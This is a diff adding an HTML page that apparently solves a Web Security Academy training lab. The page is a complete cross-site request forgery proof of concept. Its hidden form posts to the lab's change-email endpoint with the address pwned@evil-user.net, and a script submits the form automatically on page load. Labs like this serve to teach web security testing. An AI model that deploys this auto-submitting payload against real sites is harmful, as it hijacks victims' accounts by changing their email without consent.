@@ -1,0 +1,10 @@
+<html>
+    <body>
+        <form action="https://0aca00df049e481780badf6d004900bc.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
